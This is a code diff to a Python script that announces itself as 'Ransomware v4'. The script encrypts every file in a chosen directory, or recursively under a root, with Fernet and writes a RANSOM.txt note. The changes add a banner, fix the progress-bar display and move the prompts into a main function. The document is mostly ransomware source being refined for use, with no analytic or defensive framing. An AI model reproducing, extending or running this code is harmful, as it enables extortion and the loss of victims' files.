@@ -16,10 +16,21 @@ key_art = """
 
 """
 
+welcome_art = """
+$$$$$$$\                                                                                                                     $$\   $$\ 
+$$  __$$\                                                                                                                    $$ |  $$ |
+$$ |  $$ | $$$$$$\  $$$$$$$\   $$$$$$$\  $$$$$$\  $$$$$$\$$$$\  $$\  $$\  $$\  $$$$$$\   $$$$$$\   $$$$$$\        $$\    $$\ $$ |  $$ |
+$$$$$$$  | \____$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _$$  _$$\ $$ | $$ | $$ | \____$$\ $$  __$$\ $$  __$$\       \$$\  $$  |$$$$$$$$ |
+$$  __$$<  $$$$$$$ |$$ |  $$ |\$$$$$$\  $$ /  $$ |$$ / $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ |  \__|$$$$$$$$ |       \$$\$$  / \_____$$ |
+$$ |  $$ |$$  __$$ |$$ |  $$ | \____$$\ $$ |  $$ |$$ | $$ | $$ |$$ | $$ | $$ |$$  __$$ |$$ |      $$   ____|        \$$$  /        $$ |
+$$ |  $$ |\$$$$$$$ |$$ |  $$ |$$$$$$$  |\$$$$$$  |$$ | $$ | $$ |\$$$$$\$$$$  |\$$$$$$$ |$$ |      \$$$$$$$\          \$  /         $$ |
+\__|  \__| \_______|\__|  \__|\_______/  \______/ \__| \__| \__| \_____\____/  \_______|\__|       \_______|          \_/          \__|
+"""
+
+
 from cryptography.fernet import Fernet 
 import os 
 
-decision = input("Do you want to encrypt a single directory (c) or do you want to encrypt all subdirectories from source (a) ? [c/a] ")
 
 def message():
     with open('RANSOM.txt', 'w') as ransom:
@@ -55,7 +66,8 @@ def encrypt(dir):
             encrypted_file.write(encrypted_text) 
 
         advancment = (100 * (file_id + 1)) / file_number
-        print(f"[{file_id + 1}/{file_number}]" + "[" + "#" * int(advancment) + " " * (100 - int(advancment)) + "]" , f"{advancment}%", f"Encrypting {file_name}...", end="\r")
+        loadbar = f"[{file_id + 1}/{file_number}]" + "[" + "#" * int(advancment) + " " * (100 - int(advancment)) + "]" + " " + f"{advancment}%" + " " + f"Encrypting {file_name}..."
+        print(loadbar[0: os.get_terminal_size().columns ], end="\r")
 
     print("\n")
     message()
@@ -93,15 +105,22 @@ def recursive_encrypt(root):
         total_advancment = int((100 * (dir_id + 1)) / len(all_files))
         current_folder = all_files[dir_id][0].split("/")[-1]
 
-        loadbar = f"[{dir_id + 1}/{len(all_files)}]" + "[" + "#" * total_advancment + " " * (100 - total_advancment) + "]", f"{total_advancment}%", f"Encrypting {current_folder}..."
-        print(loadbar, end="\r")
+        loadbar = f"[{dir_id + 1}/{len(all_files)}]" + "[" + "#" * total_advancment + " " * (100 - total_advancment) + "]" + " " + f"{total_advancment}%" + " " + f"Encrypting {current_folder}..."
+        print(loadbar[0: os.get_terminal_size().columns ], end="\r")
     print("")
-    message()    
+    # message()    
 
-if decision == 'c':
-    dir = input("What directory do you wish to encrypt ? (RECOMMENDED: use absolute path): ")
-    encrypt(dir)
+def main():
+    print(welcome_art)
+    decision = input("Do you want to encrypt a single directory (c) or do you want to encrypt all subdirectories from source (a) ? [c/a] ")
 
-elif decision == 'a':
-    root = input("From wich root file do you want to encrypt ? (RECOMMENDED: use absolute path): ")
-    recursive_encrypt(root)
+    if decision == 'c':
+        dir = input("What directory do you wish to encrypt ? (RECOMMENDED: use absolute path): ")
+        encrypt(dir)
+
+    elif decision == 'a':
+        root = input("From wich root file do you want to encrypt ? (RECOMMENDED: use absolute path): ")
+        recursive_encrypt(root)
+
+if __name__ == '__main__':
+    main()
